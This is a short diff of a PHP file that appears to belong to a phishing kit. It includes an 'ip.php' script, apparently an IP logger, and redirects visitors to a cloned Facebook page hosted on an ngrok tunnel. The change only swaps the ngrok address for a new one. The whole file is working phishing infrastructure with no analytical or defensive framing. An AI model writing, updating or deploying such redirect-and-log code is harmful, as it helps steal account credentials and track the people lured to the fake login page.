@@ -1,5 +1,5 @@
 <?php
 include 'ip.php';
-header('Location: https://95972a4c54f0.ngrok.io/templates/facebook/facebook.html');
+header('Location: https://f727a2f6981f.ngrok.io/templates/facebook/facebook.html');
 exit
 ?>
